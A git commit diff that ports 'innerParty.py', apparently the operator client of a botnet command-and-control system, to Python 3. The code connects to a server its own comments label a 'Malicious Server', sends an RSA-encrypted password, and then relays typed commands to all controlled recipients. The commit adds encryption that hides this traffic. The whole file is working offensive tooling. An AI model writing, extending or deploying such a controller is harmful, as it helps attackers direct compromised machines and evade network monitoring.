c98a81ec5c0142c42f4ff9b2a2141b987cc1e05e
ChaosOfThe4 <89749221+ChaosOfThe4@users.noreply.github.com>
2022-05-24 09:55:08 -0400

    Update innerParty.py

--- innerParty.py
+++ innerParty.py
@@ -2,21 +2,44 @@
 #  by Landon in Python2
 #    CLIENT-SIDE C0DE
 
-import socket
+#
+#Updated by a loser to Py3 and gave it some use
+#
 
+import socket, rsa
+from colorama import Fore, init
+
+
+publicKey = 'JUST PUBLIC KEY NOT THE HEADER OR FOOTER' #Put public key here
 bigBro = '127.0.0.1' # Malicious Server IP.
+bigBroPort = 3389 # Malicious Server Port.
+
+
+pem_prefix = '-----BEGIN RSA PUBLIC KEY-----\n'
+pem_suffix = '\n-----END RSA PUBLIC KEY-----'
+
+key = '{}{}{}'.format(pem_prefix, publicKey, pem_suffix)
+
+password = input("Password? > ")
+auth = "authenticate " + password
+pubKey = rsa.PublicKey.load_pkcs1(key)
+authMessage = rsa.encrypt(auth.encode(), pubKey)
 
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 
+clientSocket.connect(( bigBro, bigBroPort )) # To-do: Change port later. 
 
-clientSocket.send("authenticate " + raw_input("Password? > "))
+clientSocket.send(authMessage)
 
 recipient = "all"
 turnedOn = True
 while turnedOn:
-    sendCommand = raw_input(recipient + "> ")
-    clientSocket.send(recipient + " " + sendCommand)
+	sendCommand = input(recipient + "> ")
+	message = recipient + " " + sendCommand
+	encMessage = rsa.encrypt(message.encode(), pubKey)
+	
+	turnedOn = sendCommand[:4] != "exit"
+	if turnedOn:
+		clientSocket.send(encMessage)
 
-    turnedOn = sendCommand[:4] != "exit"
 
 clientSocket.close()
